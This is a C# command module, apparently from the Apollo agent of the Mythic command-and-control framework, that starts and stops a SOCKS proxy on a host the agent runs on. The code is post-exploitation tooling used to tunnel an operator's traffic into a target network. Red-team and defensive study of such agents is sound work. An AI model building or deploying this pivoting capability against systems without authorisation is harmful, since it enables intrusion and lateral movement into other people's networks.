#define COMMAND_NAME_UPPER

#if DEBUG
#undef SOCKS
#define SOCKS
#endif

#if SOCKS

using Apollo.Jobs;
using Apollo.SocksProxy;
using Apollo.Tasks;
using Mythic.Structs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;

namespace Apollo.CommandModules
{
    class Socks
    {
        public struct SocksParams
        {
            public string action;
            public int port;
        }
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;

            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            string action = json.Value<string>("action");
            //SocksParams socksParams = Newtonsoft.Json.JsonConvert.DeserializeObject<SocksParams>(job.Task.parameters);
            
            switch (action)
            {
                case "start":
                    if (SocksController.IsActive())
                    {
                        job.SetError("Socks proxy is already active.");
                        return;
                    }

                    job.OnKill = delegate ()
                    {
                        SocksController.StopClientPort();
                    };

                    SocksController.StartClientPort();

                    job.SetComplete($"SOCKS server started.");
                    
                    break;
                case "stop":
                    SocksController.StopClientPort();
                    job.SetComplete("SOCKS server stopped.");
                    break;
                default:
                    job.SetError("Invalid action.");
                    break;

            }

        }
    }
}
#endif